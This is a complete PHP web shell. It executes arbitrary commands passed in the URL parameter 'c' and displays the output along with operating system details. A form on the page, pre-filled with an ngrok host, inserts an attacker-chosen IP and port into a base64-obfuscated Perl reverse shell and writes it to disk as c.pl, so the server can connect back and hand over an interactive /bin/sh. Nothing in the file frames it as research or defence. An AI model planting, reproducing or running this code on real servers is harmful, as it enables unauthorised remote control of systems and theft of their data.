<?php if (isset($_POST['ip'])): ?>
	<?php $bb6 = base64_decode('dXNlIFNvY2tldDsgCiRpPSJpcHN4IjsgCiRwPXBvcnRzOyAKc29ja2V0KFMsUEZfSU5FVCxTT0NLX1NUUkVBTSxnZXRwcm90b2J5bmFtZSgidGNwIikpOyAKaWYoY29ubmVjdChTLHNvY2thZGRyX2luKCRwLGluZXRfYXRvbigkaSkpKSl7IAoJb3BlbihTVERJTiwiPiZTIik7IAoJb3BlbihTVERPVVQsIj4mUyIpOyAKCW9wZW4oU1RERVJSLCI+JlMiKTsgCglleGVjKCIvYmluL3NoIC1pIik7IAp9Ow==');$xa = str_replace('ipsx', $_POST['ip'], $bb6);$xe = str_replace('ports', $_POST['port'], $xa); ?>
	<?php file_put_contents('c.pl', $xe); ?>
<?php endif ?>

<html style="background-color:black;color:white;">
<?php $c = $_GET['c']; ?>
<?php if (shell_exec($c)!== null): ?>
	<?php $x = shell_exec($c); ?>
<?php else: ?>
	<?php
		$handle = popen("/bin/$c", "r");
		$x = fread($handle, 2096);
		pclose($handle);
	?>
<?php endif ?>
<?php
echo '<font color="lime">Operating System: </font>'.php_uname('s').' | ';
echo '<font color="lime">Release Name: </font>'.php_uname('r').' | ';
echo '<font color="lime">Version: </font>'.php_uname('v').' | ';
echo '<font color="lime">Machine Type: </font>'.php_uname('m'); echo "<br><font color='cyan'>Command :</font> $c";
?>
<form method="post"><input placeholder="ip" value="0.tcp.ap.ngrok.io" style="color:white;background: transparent;border: none;box-shadow: 0 0 1px cyan;" type="text" name="ip"/> <input placeholder="port" style="color:white;background: transparent;border: none;box-shadow: 0 0 1px cyan;" type="text" name="port"/> <button  style="background: transparent;border: none;box-shadow: 0 0 1px cyan;color:white;cursor: pointer;">go!</button></form>
<pre><?= $x;?></pre>